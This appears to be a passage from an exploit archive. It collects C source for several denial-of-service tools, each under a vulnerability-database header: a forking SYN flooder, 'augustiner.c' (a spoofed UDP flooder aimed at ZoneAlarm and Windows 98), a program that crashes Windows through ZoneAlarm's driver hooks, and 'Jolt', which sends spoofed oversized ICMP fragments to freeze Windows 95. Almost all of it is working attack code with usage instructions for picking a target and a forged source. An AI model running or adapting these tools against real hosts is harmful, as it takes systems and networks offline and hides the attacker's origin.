{ 
	struct hostent *hp;
  
	if ((hp = gethostbyname(hostname)) == NULL) 
	{
        fprintf(stderr, "Could not resolve %s.\n", hostname);
        exit(1);
        }
    	return *(u_long *)hp->h_addr;
}



void dosynpacket(unsigned char *source_addr, unsigned char *dest_addr, int dest_port)
{
	struct send_tcp
   	{
      	struct iphdr ip;
      	struct tcphdr tcp;
   	} send_tcp;
   
	struct pseudo_header
   	{
      	unsigned int source_address;
      	unsigned int dest_address;
      	unsigned char placeholder;
      	unsigned char protocol;
      	unsigned short tcp_length;
      	struct tcphdr tcp;
   	} pseudo_header;
   
	int tcp_socket;
   	struct sockaddr_in sin;
   	int sinlen;
            
   	/* form ip packet */
   	send_tcp.ip.ihl = 5;
   	send_tcp.ip.version = 4;
   	send_tcp.ip.tos = 0;
   	send_tcp.ip.tot_len = htons(40);
   	send_tcp.ip.frag_off = 0;
   	send_tcp.ip.ttl = 255;
   	send_tcp.ip.protocol = IPPROTO_TCP;
   	send_tcp.ip.check = 0;
   	send_tcp.ip.saddr =inet_addr(source_addr);
   	send_tcp.ip.daddr =inet_addr(dest_addr);
   
   	/* form tcp packet */
   	send_tcp.tcp.dest = htons(dest_port);
   	send_tcp.tcp.ack_seq = 0;
   	send_tcp.tcp.res1 = 0;
   	send_tcp.tcp.doff = 5;
   	send_tcp.tcp.fin = 0;
   	send_tcp.tcp.syn = 1;
   	send_tcp.tcp.rst = 0;
   	send_tcp.tcp.psh = 0;
   	send_tcp.tcp.ack = 0;
   	send_tcp.tcp.urg = 0;
   	send_tcp.tcp.res2 = 0;
   	send_tcp.tcp.window = htons(512);
   	send_tcp.tcp.check = 0;
   	send_tcp.tcp.urg_ptr = 0;
   
   	/* setup the sin struct */
   	sin.sin_family = AF_INET;
   	sin.sin_port = send_tcp.tcp.source;
   	sin.sin_addr.s_addr = send_tcp.ip.daddr;   
   
   	/* (try to) open the socket */
        if((tcp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW))<0) die("socket");
      	/* set fields that need to be changed */
      	send_tcp.tcp.source++;
      	send_tcp.ip.id++;
      	send_tcp.tcp.seq++;
      	send_tcp.tcp.check = 0;
      	send_tcp.ip.check = 0;
      
      	/* calculate the ip checksum */
      	send_tcp.ip.check = in_cksum((unsigned short *)&send_tcp.ip, 20);

      	/* set the pseudo header fields */
      	pseudo_header.source_address = send_tcp.ip.saddr;
     	pseudo_header.dest_address = send_tcp.ip.daddr;
      	pseudo_header.placeholder = 0;
      	pseudo_header.protocol = IPPROTO_TCP;
      	pseudo_header.tcp_length = htons(20);
      	bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
      	send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32);
      	sinlen = sizeof(sin);
      	if((sendto(tcp_socket, &send_tcp, 40, 0, (struct sockaddr *)&sin, sinlen))<0) die("sendto");
   	close(tcp_socket);
}

main(int argc, char *argv[])

{
	int i=0,childs;
	if (argc<3) usage();
	fprintf (stdout,"\n[*] Let's start dos  [*]\n");
     	fprintf (stdout,  "[*] Wait 30 sec and after try ping %s at port %d [*]\n",argv[2],atoi(argv[3]));
        fprintf (stdout,  "[*] www.mojodo.it    [*]\n");
	fprintf (stdout,  "[*] esc with ctrl+c  [*]\n\n");

	for (i ; i<400 ;i++)
	{
		if(childs >= MAX_CHILDREN) wait(NULL) ;
		switch (fork())
			{
				case 0:
				dosynpacket(argv[1],argv[2],atoi(argv[3]));
				exit(0);
                        	case -1:
                         	die("fork");
				default:
                        	childs++;
                        	break;
			}


	}while(childs--) wait(NULL);
}
	  			
source: http://www.securityfocus.com/bid/8525/info
 
A denial of service vulnerability has been alleged in ZoneAlarm. It is reportedly possible to reproduce this condition by sending a flood of UDP packets of random sizes to random ports on a system hosting the vulnerable software.

/*
[------------------------------------------------------------------------]
[-- nologin - nologin - nologin -=]   [=- nologin - nologin - nologin  --]
[------------------------------------------------------------------------]
[-- Genre  : Denial of Service(DoS)                                    --]
[-- Name   : augustiner.c                                              --]
[-- Desc   : Udp flooder. Freezing Windows 98(not SE).                 --]
[--        :              DoS'ing Zonealarm                            --]
[-- Url    : www.nologin.org                                           --]
[-- Use    : gcc -o augustiner augustiner.c; ./augustiner              --]
[------------------------------------------------------------------------]
[-- Author : |WARL0RD|                                                 --]
[-- Date   : 8/2003                                                    --]
[-- Mod    : 9/2003                                                    --]
[------------------------------------------------------------------------]
[-- Comment: Win98 may be out of date, but it's still in widespread    --]
[--          use.                                                      --]
[--          This tool is for educational purposes only of course.     --]
[--          As of today this vuln seems unpatched.                    --]
[--          Ok after slightly modifying this code it finally has      --]
[--          the intended original effect of DoS'ing Zonealarm.        --]
[--          So augustiner.c is 2 DoS in 1. Congrats to Special        --]
[--          Discount Day.                                             --]
[------------------------------------------------------------------------]
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <netdb.h>
#include <errno.h>


#define PSEUHDR         sizeof(struct pseudohdr)
#define IP              struct iphdr
#define UDP             struct udphdr

extern int errno;


/***********************************************************/
void banner() {
        printf("\n\taugustiner.c\n");
        printf("\tVersion 1.1\n");
        printf("(c) warlord OF nologin.org\n");
        printf("Check www.nologin.org\n");
        printf("-----------------------------------\n");
return;
}

/**********************************************************/

void usage(char *name) {
        printf("Usage: %s <target> <source>\n",name);
        printf("The source address will be spoofed to what you specify\n");
        printf("Example: ./augustiner 192.168.0.1 www.microsoft.com\n");
exit(0);
}



/************************************************************/

unsigned short ipChecksum(unsigned short *ptr, int nbytes)
{
register long sum;
register u_short answer;
u_short oddbyte;

sum = 0;

while (nbytes > 1)
  {
    sum += *ptr++;
    nbytes -= 2;
  }

if (nbytes == 1)
  {
    oddbyte = 0;
    *((u_char *) & oddbyte) = *(u_char *) ptr;
    sum += oddbyte;
  }

sum = (sum >> 16) + (sum & 0xffff);
sum += (sum >> 16);
answer = ~sum;

return (answer);
}



/*****************************************************************/




int sendUDP(int sock, char *dhost,char *shost)
{
  unsigned int packetLen, minimalLength;
  unsigned char packet[(packetLen = sizeof(IP) + sizeof(UDP)+100)];
  unsigned short ppp=0;
  IP *iphdr = (IP *)packet;
  UDP *udphdr = (UDP *)((unsigned char *)packet + sizeof(IP));
  struct sockaddr_in s;
  struct hostent *he;


 srand(time(NULL));
 unsigned char minimalip[(minimalLength = 12 + sizeof(UDP))];
 memset(&s, 0, sizeof(s));
 memset(packet, 0, packetLen);
 memset(minimalip, 0, minimalLength);

 if((he=gethostbyname(shost))==NULL)
   {
     *((unsigned long *)((unsigned char *)minimalip+0)) = inet_addr(shost);
   }
  else
   {
     *((unsigned long*)((unsigned char *)minimalip+0)) = *((char *)he->h_addr);
   }


 if((he=gethostbyname(dhost))==NULL)
   {
     *((unsigned long *)((unsigned char *)minimalip+0)) = inet_addr(dhost);
   }
  else
   {
     *((unsigned long*)((unsigned char *)minimalip+0)) = *((char *)he->h_addr);
   }

 *((unsigned char *)((unsigned char *)minimalip+8)) = 0;
 *((unsigned char *)((unsigned char *)minimalip+9)) = IPPROTO_UDP;
 *((unsigned short *)((unsigned char *)minimalip+10)) = htons(packetLen - sizeof(IP));
 iphdr->version       = 4;
 iphdr->ihl      = 5;
 iphdr->id      = 60000;
 iphdr->frag_off = 0;

// iphdr->frag_off = 2050;

 if ((iphdr->saddr = inet_addr(shost)) == (unsigned long)-1)
  {
    if (!(he = gethostbyname(shost)))
      {
        printf("Couldn't resolve the src host\n");
        exit(0);
      }
    memcpy(&iphdr->saddr, he->h_addr, sizeof(iphdr->saddr));
  }

 if ((iphdr->daddr = inet_addr(dhost)) == (unsigned long)-1)
  {
    if (!(he = gethostbyname(dhost)))
      {
        printf("Couldn't resolve the dst host\n");
        exit(0);
      }
    memcpy(&iphdr->daddr, he->h_addr, sizeof(iphdr->daddr));
  }

 iphdr->protocol       = IPPROTO_UDP;
 iphdr->ttl     = 255;
 iphdr->tot_len     = packetLen;
 iphdr->check     = ipChecksum((u_short *)iphdr, sizeof(IP));
 s.sin_family      = AF_INET;

 if((he=gethostbyname(dhost))==NULL)
   {
     s.sin_addr.s_addr=inet_addr(dhost);
   }
  else
   {
     s.sin_addr=*((struct in_addr *)he->h_addr);
   }

while(1)
  {
    ppp++;
    udphdr->source = htons(20000);
    udphdr->dest =   htons(ppp);
    udphdr->len   = htons(8);
    udphdr->check = 0;

    sendto(sock, packet, packetLen, 0, (struct sockaddr *)&s, sizeof(s));
  }
 return 0;
}


/***********************************************************/



int main(int argc, char **argv) {
int sock, optval=1;

        banner();

        if(argc<3) usage(argv[0]);

        sock = socket(AF_INET,SOCK_RAW,IPPROTO_UDP);
        setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&optval,sizeof(optval));

        printf("Flooding %s with udp packets.\n",argv[1]);
        printf("Press Ctrl+C to stop\n");

        sendUDP(sock, argv[1], argv[2]);

        close(sock);

exit(0);
}

source: http://www.securityfocus.com/bid/23494/info

ZoneAlarm is prone to a local denial-of-service vulnerability.

This issue occurs when attackers supply invalid argument values to the 'vsdatant.sys' driver.

A local attacker may exploit this issue to crash affected computers, denying service to legitimate users.

ZoneAlarm Pro 6.5.737.000 and 6.1.744.001 are prone to this issue; other versions may be affected as well. 

/*

 Testing program for Multiple insufficient argument validation of hooked SSDT function (BTP00001P000ZA)
 

 Usage:
 prog FUNCNAME
   FUNCNAME - name of function to be checked

 Description:
 This program calls given function with parameters that cause the crash of the system. This happens because of 
 insufficient check of function arguments in the driver of the firewall.

 Test:
 Running the testing program with a name of a vulnerable function.

*/

#undef __STRICT_ANSI__
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <ddk/ntapi.h>
#include <ddk/ntifs.h>

void about(void)
{
  printf("Testing program for Multiple insufficient argument validation of hooked SSDT function (BTP00001P000ZA)\n");
  printf("Windows Personal Firewall analysis project\n");
  printf("Copyright 2007 by Matousec - Transparent security\n");
  printf("http://www.matousec.com/""\n\n");
  return;
}

void usage(void)
{
  printf("Usage: test FUNCNAME\n"
         "  FUNCNAME - name of function to be checked\n");
  return;
}



int main(int argc,char **argv)
{
  about();

  if (argc!=2)
  {
    usage();
    return 1;
  }

  if (!stricmp(argv[1],"NtCreateKey") || !stricmp(argv[1],"ZwCreateKey"))
  {
    HANDLE handle;
    OBJECT_ATTRIBUTES oa;
    InitializeObjectAttributes(&oa,NULL,0,NULL,NULL);

    for (oa.ObjectName=(PVOID)0x80000000;;oa.ObjectName+=0x0300)
      ZwCreateKey(&handle,0,&oa,0,NULL,0,NULL);

  } else if (!stricmp(argv[1],"NtDeleteFile") || !stricmp(argv[1],"ZwDeleteFile"))
  {
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING us={0x6B3,0x12,(PVOID)0x10000};
    InitializeObjectAttributes(&oa,&us,0,NULL,NULL);
    ZwDeleteFile(&oa);
  } else printf("\nI do not know how to exploit the vulnerability using this function.\n");

  printf("\nTEST FAILED!\n");
  return 1;
}
source: http://www.securityfocus.com/bid/5292/info

ZyXEL 642R and Prestige 310 routers have difficulties handling IP packets that are malformed. Reportedly, when ZyXEL routers receive a single specially malformed packet, they stop responding for exactly 30 seconds. 

ZyXEL 642R and Prestige 310 routers are reportedly affected by this vulnerability. It is possible that other ZyNOS-based routers are also affected by this vulnerability

/* Jolt 1.0 (c) 1997 by Jeff w. Roberson
 * Please, if you use my code give me credit.  Also, if i was the first to
 * find this glitch, please give me credit.  Thats all i ask.
 *
 * Ok so all this does is build a really fraggmented over sized packet
 * and once win95 gets it, and puts it back together it locks.  I send
 * multiple packets by default cause some times it takes a few packets to
 * totally freeze the host.  Maybe its spending processor time to figure
 * out how to put them back together?  I've had reports of people blue
 * screening from it tho so we'll let Microsoft's boys figure out exactly
 * what this does to 95.  As of now i haven't tested it on NT, but maybe
 * i will later ;).  All of this source wasn't origonally written by me
 * I just took one of the old programs to kill POSIX and SYSV based
 * systems and worked on it abit, then made it spoof =). 
 * VallaH  (yaway@hotmail.com)
 *
 *  Update: It apears to work on some older versions of mac os
 */

/* Yah this is for linux, but i like the BSD ip header better then linux's */
#define __BSD_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <string.h>
#include <arpa/inet.h>

int main(int argc, char **argv)
{
        int s,i;
        char buf[400];
        struct ip *ip = (struct ip *)buf;
        struct icmphdr *icmp = (struct icmphdr *)(ip + 1);
        struct hostent *hp, *hp2;
        struct sockaddr_in dst;
        int offset;
        int on = 1;
	int num = 5;

        bzero(buf, sizeof buf);

        if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW )) < 0) {
                perror("socket");
                exit(1);
        }
        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
                perror("IP_HDRINCL");
                exit(1);
        }
        if (argc < 3) {
		printf("Jolt v1.0 Yet ANOTHER windows95(And macOS!) glitch by VallaH (yaway@hotmail.com)\n");
                printf("\nusage: %s <dstaddr> <saddr> [number]\n",argv[0]);
		printf("\tdstaddr is the host your attacking\n");
		printf("\tsaddr is the host your spoofing from\n");
		printf("\tNumber is the number of packets to send, 5 is the default\n");
		printf("\nNOTE:  This is based on a bug that used to affect POSIX complient, and SYSV \n\t systems so its nothing new..\n");
		printf("\nGreets to Bill Gates! How do ya like this one? :-)\n");
                exit(1);
        }
        if (argc == 4) num = atoi(argv[3]);
    for (i=1;i<=num;i++) {

        if ((hp = gethostbyname(argv[1])) == NULL) {
                if ((ip->ip_dst.s_addr = inet_addr(argv[1])) == -1) {
                        fprintf(stderr, "%s: unknown host\n", argv[1]);
			exit(1);
                }
        } else {
                bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);
        }

        if ((hp2 = gethostbyname(argv[2])) == NULL) {
                if ((ip->ip_src.s_addr = inet_addr(argv[2])) == -1) {
                        fprintf(stderr, "%s: unknown host\n", argv[2]);
                        exit(1);
                }
        } else {
                bcopy(hp2->h_addr_list[0], &ip->ip_src.s_addr, hp->h_length);
        }

        printf("Sending to %s\n", inet_ntoa(ip->ip_dst));
        ip->ip_v = 4;
        ip->ip_hl = sizeof *ip >> 2;
        ip->ip_tos = 0;
        ip->ip_len = htons(sizeof buf);
        ip->ip_id = htons(4321);
        ip->ip_off = htons(0);
        ip->ip_ttl = 255;
        ip->ip_p = 1;
        ip->ip_csum = 0;                 /* kernel fills in */

        dst.sin_addr = ip->ip_dst;
        dst.sin_family = AF_INET;

        icmp->type = ICMP_ECHO;
        icmp->code = 0;
        icmp->checksum = htons(~(ICMP_ECHO << 8));
        for (offset = 0; offset < 65536; offset += (sizeof buf - sizeof *ip)) {
                ip->ip_off = htons(offset >> 3);
                if (offset < 65120)
                        ip->ip_off |= htons(0x2000);
                else
                        ip->ip_len = htons(418);  /* make total 65538 */
                if (sendto(s, buf, sizeof buf, 0, (struct sockaddr *)&dst,
                                        sizeof dst) < 0) {
                        fprintf(stderr, "offset %d: ", offset);
                        perror("sendto");
                }
                if (offset == 0) {
                        icmp->type = 0;
                        icmp->code = 0;
                        icmp->checksum = 0;
                }
        }
    }
	return 0;
}